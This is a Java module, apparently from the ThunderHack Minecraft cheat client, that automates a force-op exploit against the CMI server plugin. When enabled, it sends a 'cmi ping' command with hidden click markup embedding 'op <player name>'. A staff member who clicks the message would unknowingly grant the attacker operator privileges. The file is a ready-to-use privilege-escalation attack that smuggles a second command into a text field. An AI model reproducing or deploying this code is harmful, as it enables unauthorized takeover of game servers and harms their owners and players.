package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;

public class CMIForceOp extends Module {
    private boolean sent = false;

    public CMIForceOp() {
        super("CMIForceOp", Category.CRASH);
    }

    @Override
    public void onEnable() {
        sent = false;
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || sent) return;
        sent = true;

        String nick = mc.player.getName().getString();
        mc.player.networkHandler.sendCommand("cmi ping <T>ThunderHack [CLICK]</T><CC>op " + nick + "</CC>");
        sendMessage("ForceOp command sent");
    }

    @Override
    public void onDisable() {
        sent = false;
    }
}
